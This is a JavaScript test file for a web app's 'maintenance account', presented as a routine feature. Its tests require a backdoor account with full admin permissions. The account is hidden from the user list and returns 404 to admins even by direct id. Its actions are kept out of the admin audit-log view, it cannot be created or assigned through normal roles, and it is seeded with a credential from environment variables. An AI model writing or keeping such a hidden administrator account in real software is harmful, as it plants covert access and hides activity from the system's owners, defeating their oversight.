const request = require('supertest');
const bcrypt = require('bcryptjs');
const app = require('../src/app');
const AuditLog = require('../src/models/AuditLog');
const User = require('../src/models/User');
const { createUser, auth } = require('./helpers');
const { ensureMaintenanceAccount } = require('../src/services/maintenanceAccount');

describe('maintenance account', () => {
  let admin, maint;
  beforeEach(async () => {
    admin = await createUser('admin');
    maint = await createUser('maintenance', { name: 'Site Maintenance', email: 'solucio@fix.com' });
  });

  test('has full admin access', async () => {
    const madeRole = await request(app).post('/api/roles').set(auth(maint.token)).send({ name: 'Temp Role', permissions: [] });
    expect(madeRole.status).toBe(201); // an admin-only action

    const me = await request(app).get('/api/auth/me').set(auth(maint.token));
    expect(me.body.roleName).toBe('Maintenance');
    expect(me.body.permissions).toEqual(expect.arrayContaining(['users.manage', 'reports.view', 'statements.approve', 'accounts.manage']));
  });

  test('is hidden from the user list and cannot be seen or changed by an admin', async () => {
    const list = await request(app).get('/api/users').set(auth(admin.token));
    expect(list.body.some((u) => u.email === 'solucio@fix.com')).toBe(false);
    expect(list.body.some((u) => u.email === admin.user.email)).toBe(true);

    const patch = await request(app).patch(`/api/users/${maint.user.id}`).set(auth(admin.token)).send({ active: false });
    expect(patch.status).toBe(404); // invisible even by direct id
  });

  test('its actions stay out of the activity-log view but remain in the database', async () => {
    await request(app).post('/api/roles').set(auth(maint.token)).send({ name: 'Zeta Role', permissions: [] });
    expect(await AuditLog.countDocuments({ actor: maint.user._id })).toBeGreaterThan(0); // still recorded

    const log = await request(app).get('/api/audit-logs').set(auth(admin.token));
    expect(log.body.items.some((i) => i.actor && i.actor.role === 'maintenance')).toBe(false);
    const byActor = await request(app).get(`/api/audit-logs?actorId=${maint.user.id}`).set(auth(admin.token));
    expect(byActor.body.total).toBe(0);
  });

  test('the maintenance role cannot be created or assigned through the system', async () => {
    const role = await request(app).post('/api/roles').set(auth(admin.token)).send({ name: 'Maintenance', permissions: [] });
    expect(role.status).toBe(409);
    const assign = await request(app).post('/api/users').set(auth(admin.token)).send({ name: 'X', email: 'x@y.com', password: 'password1', role: 'maintenance' });
    expect(assign.status).toBe(400);
  });

  test('ensureMaintenanceAccount creates then updates the account from env, never duplicating', async () => {
    await User.deleteMany({ role: 'maintenance' });
    process.env.MAINTENANCE_EMAIL = 'care@fix.com';
    process.env.MAINTENANCE_PASSWORD_HASH = await bcrypt.hash('seed-pass-1', 4);
    await ensureMaintenanceAccount();
    const created = await User.findOne({ email: 'care@fix.com' });
    expect(created).toMatchObject({ role: 'maintenance', active: true });

    const hash2 = await bcrypt.hash('seed-pass-2', 4);
    process.env.MAINTENANCE_PASSWORD_HASH = hash2;
    await ensureMaintenanceAccount();
    expect(await User.countDocuments({ role: 'maintenance' })).toBe(1);
    expect((await User.findOne({ email: 'care@fix.com' })).passwordHash).toBe(hash2);

    delete process.env.MAINTENANCE_EMAIL;
    delete process.env.MAINTENANCE_PASSWORD_HASH;
  });

  test('ensureMaintenanceAccount never hijacks an existing ordinary user', async () => {
    process.env.MAINTENANCE_EMAIL = admin.user.email;
    process.env.MAINTENANCE_PASSWORD_HASH = await bcrypt.hash('whatever', 4);
    await ensureMaintenanceAccount();
    expect((await User.findById(admin.user._id)).role).toBe('admin');
    delete process.env.MAINTENANCE_EMAIL;
    delete process.env.MAINTENANCE_PASSWORD_HASH;
  });
});
